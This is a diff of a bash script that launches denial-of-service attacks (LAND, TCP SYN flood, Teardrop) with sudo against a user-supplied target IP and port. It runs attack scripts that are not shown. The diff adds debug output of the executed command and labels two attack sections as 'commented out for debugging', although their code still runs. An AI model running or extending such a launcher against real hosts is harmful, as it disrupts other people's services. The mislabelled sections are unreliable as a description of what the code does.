@@ -36,20 +36,24 @@ echo "Target IP: $TARGET_IP"
 echo "Note: Attack scripts will be run with sudo."
 
 
-# --- Land Attack ---
+# --- Land Attack ONLY for Debugging ---
 if ask_yes_no "Do you want to launch the LAND Attack?"; then
     read -p "Enter target port for LAND Attack (e.g., 139): " LAND_TARGET_PORT
     if [[ ! "$LAND_TARGET_PORT" =~ ^[0-9]+$ ]] || [ "$LAND_TARGET_PORT" -lt 1 ] || [ "$LAND_TARGET_PORT" -gt 65535 ]; then
         echo "Invalid port number. Skipping LAND Attack."
     else
         echo "[+] Launching LAND Attack on $TARGET_IP:$LAND_TARGET_PORT..."
-        sudo python3 "$LAND_ATTACK_SCRIPT" "$TARGET_IP" "$LAND_TARGET_PORT"
+        COMMAND_TO_RUN="sudo python3 $LAND_ATTACK_SCRIPT $TARGET_IP $LAND_TARGET_PORT"
+        echo "[DEBUG] Executing: $COMMAND_TO_RUN"
+        $COMMAND_TO_RUN
         echo "[+] LAND Attack script finished."
     fi
     echo "-------------------------------------"
+else
+    echo "LAND Attack skipped by user."
 fi
 
-# --- TCP SYN Flood Attack ---
+# --- TCP SYN Flood Attack (Commented out for debugging) ---
 if ask_yes_no "Do you want to launch the TCP SYN Flood Attack?"; then
     read -p "Enter target port for SYN Flood (e.g., 80): " SYN_TARGET_PORT
     if [[ ! "$SYN_TARGET_PORT" =~ ^[0-9]+$ ]] || [ "$SYN_TARGET_PORT" -lt 1 ] || [ "$SYN_TARGET_PORT" -gt 65535 ]; then
@@ -78,7 +82,7 @@ if ask_yes_no "Do you want to launch the TCP SYN Flood Attack?"; then
     echo "-------------------------------------"
 fi
 
-# --- Teardrop Attack ---
+# --- Teardrop Attack (Commented out for debugging) ---
 if ask_yes_no "Do you want to launch the Teardrop Attack?"; then
     read -p "Enter number of Teardrop packet pairs to send (e.g., 100): " TEARDROP_COUNT
     if [[ ! "$TEARDROP_COUNT" =~ ^[0-9]+$ ]] || [ "$TEARDROP_COUNT" -le 0 ]; then
@@ -91,5 +95,4 @@ if ask_yes_no "Do you want to launch the Teardrop Attack?"; then
     echo "-------------------------------------"
 fi
 
-echo "All selected attacks have been executed."
-echo "Orchestration finished."
+echo "All configured attacks finished."
